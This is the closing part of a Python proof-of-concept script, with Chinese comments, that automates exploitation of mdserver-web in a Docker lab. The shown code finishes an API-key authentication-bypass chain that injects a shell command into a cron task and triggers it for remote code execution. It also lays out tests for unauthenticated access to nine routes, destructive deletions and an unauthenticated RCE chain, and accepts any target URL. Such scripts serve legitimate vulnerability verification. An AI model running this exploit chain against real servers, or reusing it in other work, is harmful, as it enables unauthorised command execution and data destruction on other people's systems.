            # /crontab/list 返回 {"data": [...tasks...]}，data["data"] 直接是列表
            tasks_raw = data.get("data", [])
            tasks = tasks_raw if isinstance(tasks_raw, list) else tasks_raw.get("data", [])
            for t in tasks:
                if t.get("name") == "api_rce_test_task":
                    task_id = t["id"]
                    break
        except (json.JSONDecodeError, ValueError, KeyError):
            pass

    if task_id is None:
        return TestResult(
            name="API Key 认证绕过 + RCE",
            vuln_id="API-RCE",
            success=False,
            detail=f"无法获取新创建任务的 ID\nadd 响应: {add_result}",
            severity="CRITICAL"
        )

    # Step 3: 触发执行
    resp = post(f"{target}/crontab/start_task", data={"id": str(task_id)}, headers=headers)
    trigger_result = resp.text[:200] if resp else "N/A"

    # Step 4: 验证
    time.sleep(RCE_VERIFY_DELAY)
    content = docker_exec(f"cat {API_RCE_MARKER_FILE} 2>/dev/null")

    # 清理：删除测试任务和标记文件
    post(f"{target}/crontab/del", data={"id": str(task_id)}, headers=headers)
    docker_exec(f"rm -f {API_RCE_MARKER_FILE}")

    if content and RCE_MARKER_CONTENT in content:
        return TestResult(
            name="API Key 认证绕过 + RCE",
            vuln_id="API-RCE",
            success=True,
            detail=f"🔥 API Key RCE 成功！适用于所有版本（含已修复路由认证的版本）\n"
                   f"利用链: add(注入Shell) → list(获取ID={task_id}) → start_task(触发)\n"
                   f"add 响应: {add_result}\n"
                   f"start_task 响应: {trigger_result}\n"
                   f"⚠️  IP 白名单未校验，任意来源 IP 均可利用",
            severity="CRITICAL"
        )

    return TestResult(
        name="API Key 认证绕过 + RCE",
        vuln_id="API-RCE",
        success=False,
        detail=f"RCE 未验证成功\nadd 响应: {add_result}\nstart_task 响应: {trigger_result}",
        severity="CRITICAL"
    )


# ──────────────────────────────────────────────────────────────────────
# 测试编排
# ──────────────────────────────────────────────────────────────────────

def run_all_tests(ctx: TestContext):
    """执行全部测试"""
    print_banner()
    print(f"  目标: {ctx.target}")
    print(f"  跳过破坏性测试: {ctx.skip_destructive}")
    print(f"  跳过 RCE 测试: {ctx.skip_rce}")
    if ctx.api_id:
        print(f"  API App-Id: {ctx.api_id}")
        print(f"  API App-Secret: {'*' * len(ctx.api_secret)}")

    # 连通性检查
    print_section("连通性检查")
    try:
        resp = requests.get(ctx.target, timeout=TIMEOUT, allow_redirects=False)
        print(f"  [+] 目标可达, HTTP {resp.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"  [-] 目标不可达: {e}")
        print(f"  请确认漏洞环境已启动: bash docker/vuln/start.sh")
        sys.exit(1)

    # 环境准备
    if ctx.setup_task:
        setup_initial_task(ctx)
    if ctx.setup_api:
        setup_api_credentials(ctx)

    # ────── 测试组一：未授权访问漏洞 ──────
    print_section("测试组一：未授权访问漏洞（9 个路由）")

    # 信息泄露类（无破坏性）
    for test_func in [
        test_unauth_get_data_list,
        test_unauth_get_crond_find,
        test_unauth_logs,
        test_unauth_get_site_doc,
    ]:
        result = test_func(ctx)
        ctx.results.append(result)
        print_result(result)

    # 危险操作类
    for test_func in [
        test_unauth_modify_crond,
        test_unauth_start_task,
    ]:
        result = test_func(ctx)
        ctx.results.append(result)
        print_result(result)

    # 破坏性操作类
    if not ctx.skip_destructive:
        for test_func in [
            test_unauth_del_logs,
            test_unauth_set_cron_status,
            test_unauth_del,
        ]:
            result = test_func(ctx)
            ctx.results.append(result)
            print_result(result)
    else:
        print("  ⏭️  跳过破坏性测试 (del_logs, set_cron_status, del)")

    # ────── 测试组二：RCE 利用链 ──────
    if not ctx.skip_rce:
        print_section("测试组二：无认证 RCE 利用链")
        result = test_rce_chain(ctx)
        ctx.results.append(result)
        print_result(result)
    else:
        print_section("测试组二：无认证 RCE 利用链")
        print("  ⏭️  跳过 RCE 测试 (--skip-rce)")

    # ────── 测试组三：API Key 认证绕过 ──────
    if ctx.api_id and ctx.api_secret:
        print_section("测试组三：API Key 认证绕过漏洞（全版本适用）")

        for test_func in [
            test_api_bypass_session,
            test_api_ip_whitelist_bypass,
            test_api_default_open,
            test_api_invalid_appid_error,
        ]:
            result = test_func(ctx)
            ctx.results.append(result)
            print_result(result)

        if not ctx.skip_rce:
            print_section("测试组四：API Key + Shell 注入 → RCE")
            result = test_api_rce_chain(ctx)
            ctx.results.append(result)
            print_result(result)
        else:
            print_section("测试组四：API Key + Shell 注入 → RCE")
            print("  ⏭️  跳过 RCE 测试 (--skip-rce)")
    else:
        print_section("测试组三：API Key 认证绕过漏洞")
        print("  ⏭️  跳过（需提供 --api-id / --api-secret 或 --setup-api）")

    # ────── 汇总 ──────
    print_summary(ctx.results)


# ──────────────────────────────────────────────────────────────────────
# 入口
# ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="mdserver-web 漏洞自动化测试脚本",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 全量测试（自动预置任务和 API 凭据）
  python3 poc_test.py --setup-task --setup-api

  # 仅测试信息泄露，跳过破坏性和 RCE 测试
  python3 poc_test.py --skip-destructive --skip-rce

  # 自定义目标和 API 凭据
  python3 poc_test.py --target http://192.168.1.100:7200 \\
                      --api-id my_app --api-secret my_secret
        """
    )

    parser.add_argument(
        "--target", default=DEFAULT_TARGET,
        help=f"目标 URL (默认: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--skip-destructive", action="store_true",
        help="跳过破坏性测试 (del, del_logs, set_cron_status)"
    )
    parser.add_argument(
        "--skip-rce", action="store_true",
        help="跳过 RCE 利用链测试"
    )
    parser.add_argument(
        "--api-id", default="",
        help="API App-Id（测试认证绕过时使用）"
    )
    parser.add_argument(
        "--api-secret", default="",
        help="API App-Secret（测试认证绕过时使用）"
    )
    parser.add_argument(
        "--setup-api", action="store_true",
        help="自动在容器中创建 API 凭据（需 Docker 访问权限）"
    )
    parser.add_argument(
        "--setup-task", action="store_true",
        help="自动在容器中预置计划任务（需 Docker 访问权限）"
    )

    args = parser.parse_args()

    ctx = TestContext(
        target=args.target,
        skip_destructive=args.skip_destructive,
        skip_rce=args.skip_rce,
        api_id=args.api_id,
        api_secret=args.api_secret,
        setup_api=args.setup_api,
        setup_task=args.setup_task,
    )

    run_all_tests(ctx)

    # 退出码：存在漏洞返回 1
    vuln_found = any(r.success for r in ctx.results)
    sys.exit(1 if vuln_found else 0)


if __name__ == "__main__":
    main()
